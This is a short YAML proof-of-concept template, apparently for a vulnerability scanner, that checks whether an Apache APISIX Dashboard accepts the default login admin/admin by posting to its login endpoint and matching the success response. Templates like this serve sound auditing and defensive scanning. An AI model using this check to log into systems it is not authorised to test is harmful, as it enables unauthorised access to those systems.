name: poc-yaml-apache-apisix-dashboard-default-password
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /apisix/admin/user/login
            body: '{"username":"admin","password":"admin"}'
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"\"code\":0,\"message\":\"\",\"data\":")
expression: r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://github.com/apache/apisix-dashboard